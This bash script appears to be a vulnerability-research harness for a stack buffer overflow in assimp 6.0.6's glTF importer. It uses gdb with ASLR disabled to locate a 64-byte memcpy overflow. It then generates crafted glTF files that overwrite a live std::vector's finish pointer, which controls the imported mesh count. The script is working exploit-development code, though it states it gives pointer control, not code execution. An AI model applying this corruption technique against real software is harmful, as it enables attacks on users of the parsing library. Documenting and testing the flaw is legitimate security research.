#!/usr/bin/env bash
# W19: chosen-length control on the real importer's live meshes vector.
#
# W10/W14/W18 mapped document words onto std::vector<unique_ptr<aiMesh>>
# fields at glTFImporter.cpp:475: a MAT4 index accessor copies 64 document
# bytes into Indexer::GetValue<uint32_t>'s 4-byte local, and in the gcc -O2
# plain frame those bytes cover begin, finish and cap. W18 restored begin
# with a MAT2 index (16 bytes) and got a clean import. Here the full 64-byte
# destination window is captured at the vulnerable memcpy itself, written
# back verbatim, and only the finish low word is changed. Prediction: the
# live vector's size (finish-begin)/8 follows the document word, so
# CopyVector (BaseImporter.h:334-345) emits that many scene meshes.
#
# ASLR-off gdb and a gdb-measured window are stated conditions. This is
# length/pointer control, NOT code control; no marker, IP, command or r5.
set -euo pipefail
cd "$(dirname "$0")/.."

src=pins/assimp-6.0.6
driver=harness/bin/w12_o2
if [ ! -x "$driver" ]; then
    bash harness/run-w12.sh >/dev/null
fi
mkdir -p w19/evidence
trace=w19/evidence/w19.trace
log=w19/evidence/w19.log
: >"$trace"
: >"$log"

pass=0
fail=0
check() { # name, required substring
    if grep -qF -- "$2" "$trace"; then
        printf 'PASS %s\n' "$1" | tee -a "$log"
        pass=$((pass + 1))
    else
        printf 'FAIL %s (missing: %s)\n' "$1" "$2" | tee -a "$log"
        fail=$((fail + 1))
    fi
}

sha256sum "$src/code/AssetLib/glTF/glTFAsset.inl" \
          "$src/code/AssetLib/glTF/glTFImporter.cpp" >w19/evidence/source-hashes.out
cat w19/evidence/source-hashes.out >>"$trace"

pre_bp="$PWD/$src/code/AssetLib/glTF/glTFImporter.cpp:314"   # before index read
copy_bp="$PWD/$src/code/AssetLib/glTF/glTFImporter.cpp:475"  # CopyVector call

# Base document: the tracked MAT4 index case, reformatted. The reformat is
# part of the calibration: heap addresses depend on the exact input length.
python3 - <<'PY'
import base64, json, pathlib
src = pathlib.Path('harness/cases/idxptr-zero.gltf')
d = json.loads(src.read_text())
out = pathlib.Path('w19/evidence/base.gltf')
out.write_text(json.dumps(d, indent=2))
print(f'BASE bytes={out.stat().st_size}')
PY
base_len=$(wc -c <w19/evidence/base.gltf)
printf 'BASE bytes=%s\n' "$base_len" >>"$trace"

# Own vector and its stack address, measured twice; mismatch fails rather
# than producing a control calibrated against a different allocation.
for i in 1 2; do
    gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
        -ex "break $pre_bp" -ex run \
        -ex 'print/x meshes._M_impl._M_start' \
        -ex 'print/x meshes._M_impl._M_finish' \
        -ex 'print/x meshes._M_impl._M_end_of_storage' \
        -ex 'print &meshes' \
        --args "$driver" w19/evidence/base.gltf \
        >"w19/evidence/own-$i.out" 2>&1 || true
done
python3 - <<'PY' >w19/evidence/calibration.out
import pathlib, re
def vals(p):
    out = {}
    for line in pathlib.Path(p).read_text().splitlines():
        m = re.match(r'^\$(\d+) = (.*)$', line)
        if m:
            out[m.group(1)] = m.group(2)
    return out
a = vals('w19/evidence/own-1.out')
b = vals('w19/evidence/own-2.out')
assert a == b, f'calibration unstable: {a} vs {b}'
addr = a['4'].split()[-1]
print('CAL own_begin=%s own_finish=%s own_cap=%s vector=%s dest=%s stable=1' % (
    a['1'], a['2'], a['3'], addr, hex(int(addr, 16) - 12)))
PY
cat w19/evidence/calibration.out >>"$trace"
cal=$(cat w19/evidence/calibration.out)
own_begin=$(python3 -c "print('$cal'.split()[1].split('=')[1])")

# Discover the vulnerable destination instead of deriving it from the vector
# address: that offset varies with the driver path and environment. The last
# 64-byte memcpy before the import fault is the index overflow.
cat >w19/evidence/discover.gdb <<'GDB'
set disable-randomization on
start
break memcpy@plt if $rdx == 64
commands
silent
printf "DST=%p SRC=%p N=%lu\n", $rdi, $rsi, $rdx
continue
end
continue
GDB
gdb -q -batch -x w19/evidence/discover.gdb --args "$driver" w19/evidence/base.gltf \
    >w19/evidence/discover.out 2>&1 || true
dest=$(grep '^DST=' w19/evidence/discover.out | tail -1 | awk '{print $1}' | cut -d= -f2)
[ -n "$dest" ] || { echo 'FAIL no 64-byte memcpy destination discovered' | tee -a "$log"; exit 1; }
printf 'DISC last_64byte_memcpy dest=%s\n' "$dest" >>"$trace"

# Capture the exact 64 bytes at that destination before the overwrite. A
# window taken earlier at :314 is stale in two bytes and produces a
# corrupt-pointer abort; this call-site capture is self-calibrating.
gdb -q -batch -ex 'set disable-randomization on' -ex start \
    -ex "break memcpy@plt if \$rdi == $dest && \$rdx == 64" \
    -ex continue -ex 'printf "DST=%p SRC=%p N=%lu\n", $rdi, $rsi, $rdx' \
    -ex 'x/64bx $rdi' --args "$driver" w19/evidence/base.gltf \
    >w19/evidence/window-gdb.out 2>&1 || true
python3 - "$own_begin" >w19/evidence/window.out <<'PY'
import pathlib, re, hashlib, sys
own = int(sys.argv[1], 16)
t = pathlib.Path('w19/evidence/window-gdb.out').read_text()
assert 'DST=' in t, 'vulnerable memcpy was not reached'
rows = [l for l in t.splitlines() if re.match(r'^0x[0-9a-f]+:\s', l)]
assert rows, 'no window dump'
bs = []
for l in rows:
    bs += [int(x, 16) for x in re.findall(r'\b0x([0-9a-f]{2})\b', l)]
assert len(bs) == 64, f'expected 64 bytes, got {len(bs)}'
win = bytes(bs)
low = int.from_bytes(win[12:16], 'little')
assert low == (own & 0xffffffff), f'window begin low {low:#x} != own {own:#x}'
pathlib.Path('w19/evidence/window.hex').write_text(win.hex() + '\n')
print('WIN bytes=64 sha256=%s begin=%s finish=%s cap=%s begin_low_matches_own=1' % (
    hashlib.sha256(win).hexdigest(), win[12:20].hex(), win[20:28].hex(),
    win[28:36].hex()))
PY
cat w19/evidence/window.out >>"$trace"
grep -m1 '^DST=' w19/evidence/window-gdb.out >>"$trace" || true

# Generate the controls: only the finish low word (window offset 20..23,
# document bytes 56..59) changes. Input length stays fixed so the measured
# window remains the right one.
python3 - <<'PY'
import base64, json, pathlib
win = bytearray.fromhex(pathlib.Path('w19/evidence/window.hex').read_text().strip())
d0 = json.loads(pathlib.Path('w19/evidence/base.gltf').read_text())
prefix, b64 = d0['buffers']['buf']['uri'].split('base64,', 1)
buf0 = bytearray(base64.b64decode(b64))
for n in (0, 1, 2, 3):
    w = bytearray(win)
    w[20:24] = (int.from_bytes(win[12:16], 'little') + n * 8).to_bytes(4, 'little')
    b = bytearray(buf0)
    b[36:100] = w
    d = json.loads(pathlib.Path('w19/evidence/base.gltf').read_text())
    d['buffers']['buf']['uri'] = prefix + 'base64,' + base64.b64encode(bytes(b)).decode()
    p = pathlib.Path('w19/evidence/len%d.gltf' % n)
    p.write_text(json.dumps(d, indent=2))
    assert p.stat().st_size == 1246, p.stat().st_size
PY

for n in 0 1 2 3; do
    gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
        -ex "break $copy_bp" -ex run \
        -ex 'print/x meshes._M_impl._M_start' \
        -ex 'print/x meshes._M_impl._M_finish' \
        -ex 'print/x meshes._M_impl._M_end_of_storage' \
        -ex continue \
        --args "$driver" w19/evidence/len$n.gltf \
        >"w19/evidence/len$n-gdb.out" 2>&1 || true
    python3 - "$n" "$own_begin" "$dest" <<'PY' >>"$trace"
import pathlib, re, sys
n, own, dest = sys.argv[1], sys.argv[2], sys.argv[3]
t = pathlib.Path(f'w19/evidence/len{n}-gdb.out').read_text()
vals = re.findall(r'^\$([123]) = (0x[0-9a-f]+)$', t, re.M)
vals = {k: v for k, v in vals} if vals else {}
begin = next((v for k, v in re.findall(r'^\$([123]) = (0x[0-9a-f]+)$', t, re.M) if k == '1'), None)
finish = next((v for k, v in re.findall(r'^\$([123]) = (0x[0-9a-f]+)$', t, re.M) if k == '2'), None)
cap = next((v for k, v in re.findall(r'^\$([123]) = (0x[0-9a-f]+)$', t, re.M) if k == '3'), None)
want = hex(int(own, 16) + int(n) * 8)
meshes = re.search(r'^meshes=(\d+)$', t, re.M)
print('LEN%s begin=%s finish=%s want=%s cap=%s meshes=%s scene=%s exit=%s follows=%s' % (
    n, begin, finish, want, cap, meshes.group(1) if meshes else 'NONE',
    'ok' if 'scene=ok' in t else 'BAD',
    'normal' if 'exited normally' in t else 'ABNORMAL',
    '1' if (begin == own and finish == want and meshes and meshes.group(1) == n) else '0'))
PY
done

# Negative: with ASLR on, the fixed document word does not match the live
# low word, so no clean import is claimed outside the calibrated layout.
rc=0
"$driver" w19/evidence/len3.gltf >w19/evidence/plain.out 2>&1 || rc=$?
printf 'NEG plain rc=%s\n' "$rc" >>"$trace"
printf 'FOLLOW count=%s expected=4\n' "$(grep -c 'follows=1' "$trace" || true)" >>"$trace"

check 'vulnerable memcpy destination discovered' 'DISC last_64byte_memcpy dest='
check 'captured window matches own vector' 'begin_low_matches_own=1'
check 'source hashes pinned' 'glTFAsset.inl'
check 'input length fixed' 'BASE bytes=1246'
check 'calibration stable across two measurements' 'stable=1'
check 'vulnerable 64-byte memcpy reached' 'DST='
check 'all four lengths follow the document' 'FOLLOW count=4 expected=4'
check 'size0 scene has zero meshes' 'meshes=0 scene=ok exit=normal follows=1'
check 'size1 scene has one mesh' 'meshes=1 scene=ok exit=normal follows=1'
check 'size2 scene has two meshes' 'meshes=2 scene=ok exit=normal follows=1'
check 'size3 scene has three meshes' 'meshes=3 scene=ok exit=normal follows=1'
check 'ASLR-on plain run is a negative' 'NEG plain rc=139'

printf 'TOTAL pass=%d fail=%d\n' "$pass" "$fail" >>"$trace"
sha256sum "$trace" >w19/evidence/w19.trace.sha256
cat "$trace"
[ "$fail" -eq 0 ]
